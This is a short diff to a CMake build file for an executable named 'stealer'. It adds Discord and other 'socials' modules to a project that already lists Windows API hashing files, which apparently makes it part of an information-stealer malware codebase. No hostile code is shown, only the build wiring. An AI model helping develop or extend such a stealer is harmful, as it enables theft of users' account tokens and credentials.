@@ -21,4 +21,8 @@ add_executable(stealer src/main.cpp
         include/winapi.cpp
         include/winapi.h
         include/winapi_hash.h
+        src/stealer/impl/socials/Socials.cpp
+        src/stealer/impl/socials/Socials.h
+        src/stealer/impl/socials/impl/Discord.cpp
+        src/stealer/impl/socials/impl/Discord.h
 )
